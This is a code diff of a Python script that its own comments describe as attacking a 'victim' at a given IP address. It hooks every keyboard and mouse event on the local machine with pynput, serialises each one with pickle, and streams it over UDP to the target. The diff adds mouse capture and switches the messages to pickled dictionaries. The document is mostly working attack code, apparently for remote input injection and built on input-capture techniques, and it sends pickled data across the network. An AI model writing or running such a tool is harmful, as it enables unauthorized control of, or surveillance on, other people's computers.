@@ -2,7 +2,9 @@
 
 import sys
 from socket import socket, AF_INET, SOCK_DGRAM, gethostbyname_ex, gethostname
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener as KeyListener
+from pynput.mouse import Listener as MouseListener
+import pickle
 
 # Attack the victim at a given IP address
 SERVER_IP   = sys.argv[1]
@@ -15,26 +17,74 @@ print("Attacking victim at {0}:{1}\n".format(SERVER_IP, PORT_NUMBER))
 msg_socket = socket( AF_INET, SOCK_DGRAM )
 
 def on_press(key):
-    msg = None
+    _key = None
     try:
-        msg = '{0} pressed'.format(key.char)
+        _key = '{0}'.format(key.char)
     except:
-        msg = '{0} pressed'.format(key)
+        _key = '{0}'.format(key)
+    msg = {
+        "type": "key",
+        "action": "press",
+        "key": _key
+    }
     print(msg)
-    msg_socket.sendto(msg.encode('utf-8'), SERVER)
+    msg_socket.sendto(pickle.dumps(msg), SERVER)
 
 def on_release(key):
-    msg = None
+    _key = None
     try:
-        msg = '{0} released'.format(key.char)
+        _key = '{0}'.format(key.char)
     except:
-        msg = '{0} released'.format(key)
+        _key = '{0}'.format(key)
+    msg = {
+        "type": "key",
+        "action": "release",
+        "key": _key
+    }
     print(msg)
-    msg_socket.sendto(msg.encode('utf-8'), SERVER)
+    msg_socket.sendto(pickle.dumps(msg), SERVER)
 
-# Collect events until released
-with Listener(
+def on_move(x, y):
+    msg = {
+        "type": "mouse",
+        "action": "move",
+        "x": x,
+        "y": y
+    }
+    print(msg)
+    msg_socket.sendto(pickle.dumps(msg), SERVER)
+
+def on_click(x, y, button, pressed):
+    msg = {
+        "type": "mouse",
+        "action": "click",
+        "button": button,
+        "pressed": pressed
+    }
+    print(msg)
+    msg_socket.sendto(pickle.dumps(msg), SERVER)
+
+def on_scroll(x, y, dx, dy):
+    msg = {
+        "type": "mouse",
+        "action": "scroll",
+        "x": x,
+        "y": y,
+        "dx": dx,
+        "dy": dy
+    }
+    print(msg)
+    msg_socket.sendto(pickle.dumps(msg), SERVER)
+
+
+mouse_listener = MouseListener(
+    on_move=on_move,
+    on_click=on_click,
+    on_scroll=on_scroll)
+mouse_listener.start()
+
+# Collect events until Ctrl C
+with KeyListener(
         on_press=on_press,
-        on_release=on_release) as listener:
-    listener.join()
-
+        on_release=on_release) as key_listener:
+    key_listener.join()
